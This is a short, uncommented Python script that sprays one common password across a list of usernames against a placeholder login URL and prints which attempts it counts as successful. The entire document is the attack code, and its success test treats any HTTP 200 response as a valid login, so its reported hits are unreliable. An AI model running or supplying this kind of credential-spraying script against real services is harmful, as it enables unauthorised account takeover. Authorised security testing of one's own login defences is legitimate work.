import requests

TARGET = "https://your-app/login"
USERS = ["admin", "test", "jsmith"]
PASSWORD = "Password123!"

for user in USERS:
    resp = requests.post(TARGET, data={"username": user, "password": PASSWORD})
    if "Welcome" in resp.text or resp.status_code == 200:
        print(f"[+] Success: {user}:{PASSWORD}")
    else:
        print(f"[-] Fail: {user}")
